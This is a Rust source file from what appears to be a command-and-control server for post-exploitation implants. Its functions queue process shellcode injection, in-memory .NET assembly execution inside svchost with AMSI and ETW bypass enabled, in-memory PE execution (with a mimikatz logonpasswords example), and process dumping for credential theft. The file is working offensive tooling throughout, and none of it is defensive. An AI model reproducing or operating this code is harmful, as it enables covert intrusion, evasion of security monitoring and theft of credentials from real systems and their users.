use actix_web::web;
use server::links::Links;

// internal packages
use crate::server;
use crate::util;

pub fn link_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 2 {
        println!("link-inject <pid> \n   eg: link-inject 1307");
        return;
    }
    if std::fs::metadata("./link.bin").is_err() {
        println!("generate links first");
        println!("there must be link.bin in the current directory");
        return;
    }
    let shellcode = match std::fs::read("link.bin") {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(shellcode) => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[0] = "inject".to_string();
    updated_command.push(shellcode_b64);
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("inject <pid> <path-to-shellcode>\n   eg: inject 1307 /tmp/shellcode.bin");
        return;
    }
    let shellcode = match std::fs::read(command[2].clone()) {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(shellcode) => shellcode,
    };
    let shellcode_b64 = base64::encode(shellcode);
    let mut updated_command = command.clone();
    updated_command[2] = shellcode_b64;
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_assembly(links: web::Data<Links>, link_index: usize, mut command: Vec<String>) {
    if command.len() == 2 {
        command.push(" ".to_string());
    }
    if command.len() < 3 {
        println!("execute-assembly <path-to-assembly> <parameters>\n    eg: execute-assembly /tmp/SharpTool.exe -all");
        return;
    }
    // check for SharpCollection
    let mut sharpcollection_tool = String::new();
    if command[0] == *"sharp" {
        sharpcollection_tool = command[1].clone();
        let tool_path = util::sharp::get_sharp_path(command[1].clone());
        if tool_path.is_empty() {
            println!("could not find tool, at the main menu the following command may help:");
            println!("sharp init");
            return;
        }
        command[0] = "execute-assembly".to_string();
        command[1] = tool_path;
    }
    // 0 name
    let mut updated_command: Vec<String> = vec![command[0].clone()];
    // 1 assembly
    let assembly = match std::fs::read(command[1].clone()) {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(assembly) => assembly,
    };
    let assembly_b64 = base64::encode(assembly);
    updated_command.push(assembly_b64);
    // 2 hostingdll
    let hostingclr_dll = include_bytes!("../assets/HostingCLRx64.dll");
    let hostingclr_dll_b64 = base64::encode(hostingclr_dll);
    updated_command.push(hostingclr_dll_b64);
    // 3 process
    updated_command.push("svchost".to_string());
    // 4 amsi bool
    updated_command.push("true".to_string());
    // 5 etw bool
    updated_command.push("true".to_string());
    // 6 parameters
    updated_command.extend_from_slice(&command[2..]);

    // update original command if SharpCollection
    if !sharpcollection_tool.is_empty() {
        command[0] = "sharp".to_string();
        command[1] = sharpcollection_tool;
    }
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn execute_pe(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 3 {
        println!("execute-pe <path-to-pe> <args>\n   eg: execute-pe /tmp/mimikatz.exe sekurlsa::logonpasswords exit");
        return;
    }
    let pe = match std::fs::read(command[1].clone()) {
        Err(e) => {
            println!("{}", e);
            return;
        }
        Ok(pe) => pe,
    };
    let pe_b64 = base64::encode(pe);
    let mut updated_command = command.clone();
    updated_command[1] = pe_b64;
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn procdump(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 2 {
        println!("procpdump <pid>\n   eg: procdump 1473");
        return;
    }
    let mut updated_command = command.clone();
    if command[0] == "mimikatz".to_string() {
        updated_command[0] = "procdump".to_string();
    }
    updated_command[1] = command[1].clone();
    links.links.lock().unwrap()[link_index]
        .set_command(updated_command.join(" "), command.join(" "));
}

pub fn mimikatz(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() < 1 {
        println!("mimikatz\n   eg: mimikatz");
        return;
    }
    let updated_command = vec!["mimikatz".to_string(), "0".to_string()];
    procdump(links, link_index, updated_command);
}
